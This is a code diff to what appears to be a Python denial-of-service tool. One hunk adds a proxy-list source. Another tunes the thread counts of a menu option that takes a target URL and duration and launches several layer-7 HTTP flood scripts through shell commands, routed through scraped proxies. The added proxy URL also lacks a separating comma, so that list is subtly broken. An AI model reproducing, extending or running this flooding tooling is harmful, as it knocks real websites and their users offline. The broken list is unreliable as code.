@@ -55,7 +55,8 @@ class Home:
 		        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
 		        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
 		        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
-		        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all"]
+		        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all"
+		        "https://openproxylist.xyz/all.txt"]
 		with open(file_name, 'w'):
 			for proxies in http_proxies:
 				if httpx.get(proxies).status_code == 200:
@@ -696,10 +697,10 @@ Sex Senpai •~•
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/http.txt 512'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 20 utils/http.txt 512'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Zeus-Lord {url} {floodtime} 850 15 utils/http.txt'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/FUKU {url} {floodtime} 512 15 utils/http.txt'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/FUKU {url} {floodtime} 512 20 utils/http.txt'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
